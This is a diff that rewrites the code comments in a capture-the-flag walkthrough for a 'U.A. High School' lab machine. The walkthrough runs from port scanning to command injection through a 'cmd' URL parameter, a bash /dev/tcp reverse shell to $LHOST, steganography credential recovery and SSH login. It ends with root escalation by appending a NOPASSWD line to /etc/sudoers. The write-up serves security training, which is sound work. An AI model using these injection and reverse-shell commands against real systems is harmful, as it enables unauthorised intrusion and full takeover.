@@ -57,8 +57,8 @@ sudo su - ? root.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port discovery scan and service version enumeration.
+# Why here: identify the attack surface, including SSH and the Apache web server hosting the U.A. High School site.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,80 $TARGET -oA service
 ```
@@ -77,8 +77,8 @@ See [nmap.md](../../tools/recon/nmap.md).
 ```bash
 whatweb http://$TARGET
 # Email[info@yuei.ac.jp]    ? noted for later
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force directories and files on the web server.
+# Why here: discover the assets directory and any potential PHP entry points.
 feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html
 ```
 
@@ -96,12 +96,12 @@ Tools: [whatweb](../../tools/recon/whatweb.md), [feroxbuster](../../tools/fuzz/f
 Full technique: [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: test the suspected 'cmd' parameter for OS command injection.
+# Why here: verify the vulnerability by executing 'whoami' and decoding the base64-encoded response.
 curl "http://$TARGET/assets/index.php?cmd=whoami"
 # d3d3LWRhdGEK
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the base64 response from the injection point.
+# Why here: confirm the user context of the command execution (www-data).
 echo 'd3d3LWRhdGEK' | base64 -d
 # www-data
 ```
@@ -109,19 +109,19 @@ echo 'd3d3LWRhdGEK' | base64 -d
 Response is base64-wrapped. Reverse shell:
 ```bash
 # Attacker
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: set up a netcat listener.
+# Why here: receive the reverse shell connection from the target.
 nc -lvnp 4444
 
 # Target (URL-encoded)
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: trigger a bash reverse shell via the command injection point.
+# Why here: establish an interactive foothold as the www-data user.
 curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
 ```
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: upgrade the reverse shell to a full PTY.
+# Why here: enable full terminal interactivity for efficient local enumeration.
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -189,20 +189,20 @@ printf '\xFF\xD8' | dd of=oneforall.jpg bs=1 count=2 conv=notrunc
 
 Extract with the passphrase from §4:
 ```bash
-# What it does: inspects or extracts hidden content/metadata from a file.
-# Why here: recover clues or credentials hidden in assets.
+# What it does: attempt to extract hidden data from the image with steghide.
+# Why here: recover the credentials file hidden in the JPG using the previously discovered passphrase.
 steghide extract -sf oneforall.jpg
 # Enter passphrase: AllmightForEver!!!
 # wrote extracted data to "creds.txt"
 
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the extracted credentials.
+# Why here: recover the SSH password for the user 'deku'.
 cat creds.txt       # deku SSH credentials
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: connect to the target via SSH as 'deku'.
+# Why here: escalate from the web user (www-data) to a system user with more privileges.
 ssh deku@$TARGET
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the user flag.
+# Why here: complete the first phase of the challenge.
 cat /home/deku/user.txt
 ```
 
@@ -237,8 +237,8 @@ fi
 Blacklist covers command substitution but **not `>>`**. Payload:
 
 ```bash
-# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
-# Why here: disparar la primitiva de privesc encontrada con sudo -l.
+# What it does: execute the sudo-allowed feedback.sh script.
+# Why here: leverage the eval-injection vulnerability to append a NOPASSWD entry to the sudoers file.
 sudo /opt/NewComponent/feedback.sh
 # Enter your feedback:
 deku ALL=NOPASSWD: ALL >> /etc/sudoers
